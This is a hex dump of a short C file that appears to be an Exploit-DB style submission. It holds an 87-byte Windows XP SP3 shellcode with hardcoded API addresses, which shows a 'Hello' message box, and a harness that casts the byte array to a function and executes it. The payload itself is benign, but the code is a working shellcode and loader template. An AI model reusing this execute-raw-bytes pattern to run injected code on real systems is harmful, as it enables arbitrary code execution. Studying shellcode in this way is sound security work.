00000000  2f 2a 20 0d 0a 54 69 74  6c 65 3a 20 57 69 6e 64  |/* ..Title: Wind|
00000010  6f 77 73 20 58 50 20 53  50 33 20 45 6e 67 6c 69  |ows XP SP3 Engli|
00000020  73 68 20 4d 65 73 73 61  67 65 42 6f 78 41 20 53  |sh MessageBoxA S|
00000030  68 65 6c 6c 63 6f 64 65  20 28 38 37 20 62 79 74  |hellcode (87 byt|
00000040  65 73 29 0d 0a 44 61 74  65 3a 20 41 75 67 75 73  |es)..Date: Augus|
00000050  74 20 32 30 2c 20 32 30  31 30 0d 0a 41 75 74 68  |t 20, 2010..Auth|
00000060  6f 72 3a 20 47 6c 61 66  6b 6f 73 20 43 68 61 72  |or: Glafkos Char|
00000070  61 6c 61 6d 62 6f 75 73  20 28 67 6c 61 66 6b 6f  |alambous (glafko|
00000080  73 5b 40 5d 61 73 74 61  6c 61 76 69 73 74 61 5b  |s[@]astalavista[|
00000090  64 6f 74 5d 63 6f 6d 29  0d 0a 54 65 73 74 65 64  |dot]com)..Tested|
000000a0  20 6f 6e 3a 20 57 69 6e  64 6f 77 73 20 58 50 20  | on: Windows XP |
000000b0  53 50 33 20 45 6e 0d 0a  54 68 61 6e 6b 73 3a 20  |SP3 En..Thanks: |
000000c0  69 73 68 74 75 73 0d 0a  47 72 65 65 74 7a 3a 20  |ishtus..Greetz: |
000000d0  41 73 74 61 6c 61 76 69  73 74 61 2c 20 4f 66 66  |Astalavista, Off|
000000e0  53 45 43 2c 20 45 78 70  6c 6f 69 74 2d 44 42 0d  |SEC, Exploit-DB.|
000000f0  0a 2a 2f 0d 0a 0d 0a 23  69 6e 63 6c 75 64 65 20  |.*/....#include |
00000100  3c 73 74 64 69 6f 2e 68  3e 0d 0a 0d 0a 63 68 61  |<stdio.h>....cha|
00000110  72 20 73 68 65 6c 6c 63  6f 64 65 5b 5d 20 3d 0d  |r shellcode[] =.|
00000120  0a 22 5c 78 33 31 5c 78  63 30 5c 78 33 31 5c 78  |."\x31\xc0\x31\x|
00000130  64 62 5c 78 33 31 5c 78  63 39 5c 78 33 31 5c 78  |db\x31\xc9\x31\x|
00000140  64 32 22 0d 0a 22 5c 78  35 31 5c 78 36 38 5c 78  |d2".."\x51\x68\x|
00000150  36 63 5c 78 36 63 5c 78  32 30 5c 78 32 30 5c 78  |6c\x6c\x20\x20\x|
00000160  36 38 5c 78 33 33 22 0d  0a 22 5c 78 33 32 5c 78  |68\x33".."\x32\x|
00000170  32 65 5c 78 36 34 5c 78  36 38 5c 78 37 35 5c 78  |2e\x64\x68\x75\x|
00000180  37 33 5c 78 36 35 5c 78  37 32 22 0d 0a 22 5c 78  |73\x65\x72".."\x|
00000190  38 39 5c 78 65 31 5c 78  62 62 5c 78 37 62 5c 78  |89\xe1\xbb\x7b\x|
000001a0  31 64 5c 78 38 30 5c 78  37 63 5c 78 35 31 22 20  |1d\x80\x7c\x51" |
000001b0  2f 2f 20 30 78 37 63 38  30 31 64 37 62 20 3b 20  |// 0x7c801d7b ; |
000001c0  4c 6f 61 64 4c 69 62 72  61 72 79 41 28 75 73 65  |LoadLibraryA(use|
000001d0  72 33 32 2e 64 6c 6c 29  0d 0a 22 5c 78 66 66 5c  |r32.dll).."\xff\|
000001e0  78 64 33 5c 78 62 39 5c  78 35 65 5c 78 36 37 5c  |xd3\xb9\x5e\x67\|
000001f0  78 33 30 5c 78 65 66 5c  78 38 31 22 0d 0a 22 5c  |x30\xef\x81".."\|
00000200  78 63 31 5c 78 31 31 5c  78 31 31 5c 78 31 31 5c  |xc1\x11\x11\x11\|
00000210  78 31 31 5c 78 35 31 5c  78 36 38 5c 78 36 31 22  |x11\x51\x68\x61"|
00000220  0d 0a 22 5c 78 36 37 5c  78 36 35 5c 78 34 32 5c  |.."\x67\x65\x42\|
00000230  78 36 38 5c 78 34 64 5c  78 36 35 5c 78 37 33 5c  |x68\x4d\x65\x73\|
00000240  78 37 33 22 0d 0a 22 5c  78 38 39 5c 78 65 31 5c  |x73".."\x89\xe1\|
00000250  78 35 31 5c 78 35 30 5c  78 62 62 5c 78 34 30 5c  |x51\x50\xbb\x40\|
00000260  78 61 65 5c 78 38 30 22  20 2f 2f 20 30 78 37 63  |xae\x80" // 0x7c|
00000270  38 30 61 65 34 30 20 3b  20 47 65 74 50 72 6f 63  |80ae40 ; GetProc|
00000280  41 64 64 72 65 73 73 28  75 73 65 72 33 32 2e 64  |Address(user32.d|
00000290  6c 6c 2c 20 4d 65 73 73  61 67 65 42 6f 78 41 29  |ll, MessageBoxA)|
000002a0  0d 0a 22 5c 78 37 63 5c  78 66 66 5c 78 64 33 5c  |.."\x7c\xff\xd3\|
000002b0  78 38 39 5c 78 65 31 5c  78 33 31 5c 78 64 32 5c  |x89\xe1\x31\xd2\|
000002c0  78 35 32 22 0d 0a 22 5c  78 35 31 5c 78 35 31 5c  |x52".."\x51\x51\|
000002d0  78 35 32 5c 78 66 66 5c  78 64 30 5c 78 33 31 5c  |x52\xff\xd0\x31\|
000002e0  78 63 30 5c 78 35 30 22  0d 0a 22 5c 78 62 38 5c  |xc0\x50".."\xb8\|
000002f0  78 31 32 5c 78 63 62 5c  78 38 31 5c 78 37 63 5c  |x12\xcb\x81\x7c\|
00000300  78 66 66 5c 78 64 30 22  3b 20 20 20 20 2f 2f 20  |xff\xd0";    // |
00000310  30 78 37 63 38 31 63 62  31 32 20 3b 20 45 78 69  |0x7c81cb12 ; Exi|
00000320  74 50 72 6f 63 65 73 73  28 30 29 0d 0a 0d 0a 69  |tProcess(0)....i|
00000330  6e 74 20 6d 61 69 6e 28  69 6e 74 20 61 72 67 63  |nt main(int argc|
00000340  2c 20 63 68 61 72 20 2a  2a 61 72 67 76 29 0d 0a  |, char **argv)..|
00000350  7b 0d 0a 20 20 20 69 6e  74 20 28 2a 66 75 6e 63  |{..   int (*func|
00000360  29 28 29 3b 0d 0a 20 20  20 66 75 6e 63 20 3d 20  |)();..   func = |
00000370  28 69 6e 74 20 28 2a 29  28 29 29 20 73 68 65 6c  |(int (*)()) shel|
00000380  6c 63 6f 64 65 3b 0d 0a  20 20 20 70 72 69 6e 74  |lcode;..   print|
00000390  66 28 22 53 68 65 6c 6c  63 6f 64 65 20 4c 65 6e  |f("Shellcode Len|
000003a0  67 74 68 20 69 73 20 3a  20 25 64 22 2c 73 74 72  |gth is : %d",str|
000003b0  6c 65 6e 28 73 68 65 6c  6c 63 6f 64 65 29 29 3b  |len(shellcode));|
000003c0  0d 0a 20 20 20 28 69 6e  74 29 28 2a 66 75 6e 63  |..   (int)(*func|
000003d0  29 28 29 3b                                       |)();|
000003d4
